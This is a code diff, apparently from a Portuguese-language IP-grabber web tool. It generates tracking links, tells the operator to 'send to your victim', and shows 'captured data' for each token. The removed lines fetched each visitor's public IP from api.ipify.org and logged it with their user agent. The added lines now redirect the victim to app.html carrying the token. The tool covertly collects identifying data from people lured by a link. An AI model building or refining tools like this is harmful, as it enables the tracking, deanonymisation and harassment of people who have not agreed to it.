@@ -315,20 +315,17 @@ function generateLink() {
   const div = document.createElement('div');
   div.innerHTML = `
     <strong>Link:</strong> <a href="${link}" target="_blank">${link}</a><br>
-    <button onclick="copyLink('${link}', this)">Copiar Link</button>
     <button onclick="showCapturedData('${token}')">Mostrar Dados Capturados</button>
     <div id="data-${token}" style="margin-top: 5px; font-size: 0.9rem;"></div>
     <hr>
   `;
   container.appendChild(div);
-}
 
-// Copiar link e mostrar mensagens
-function copyLink(link, btn) {
+  // Copiar link automaticamente e mostrar mensagens:
   navigator.clipboard.writeText(link).then(() => {
-    btn.textContent = 'Link copiado! Envie para sua vítima.';
+    alert('Link copiado! Envie para sua vítima.');
     setTimeout(() => {
-      btn.textContent = 'Vítima conectada';
+      alert('Vítima conectada!');
     }, 3000);
   });
 }
@@ -443,37 +440,13 @@ function clearData() {
   for (const key in captureData) delete captureData[key];
 }
 
-// Captura dados ao acessar link com token
+// Redirecionar vítima para app.html com token na URL
 window.addEventListener('load', () => {
   const urlParams = new URLSearchParams(window.location.search);
   const token = urlParams.get('token');
 
   if (token && captureData[token]) {
-    fetch('https://api.ipify.org?format=json')
-      .then(res => res.json())
-      .then(data => {
-        captureData[token].ips.push(data.ip);
-        captureData[token].userAgents.push(navigator.userAgent);
-
-        // Mostra só botão fechar, sem dados
-        document.body.innerHTML = `
-          <div style="text-align:center; margin-top:40vh; color:#00ff99; font-family: monospace;">
-            <h2>Vítima Conectada</h2>
-            <button
-              style="padding:20px 40px; font-size:1.5rem; background:#00ff99; border:none; border-radius:8px; cursor:pointer; font-family: monospace;"
-              onclick="
-                window.close();
-                setTimeout(() => {
-                  document.body.innerHTML = '<h2 style=\\'color:#00ff99; font-family: monospace; text-align:center; margin-top:40vh;\\'>Feche esta aba manualmente.</h2>';
-                }, 500);
-              "
-            >FECHAR</button>
-          </div>
-        `;
-      })
-      .catch(() => {
-        document.body.innerHTML = `<p style="color:#ff4444; font-family: monospace; text-align:center; margin-top:40vh;">Erro ao capturar IP.</p>`;
-      });
+    window.location.href = `app.html?token=${token}`;
   }
 });
 </script>
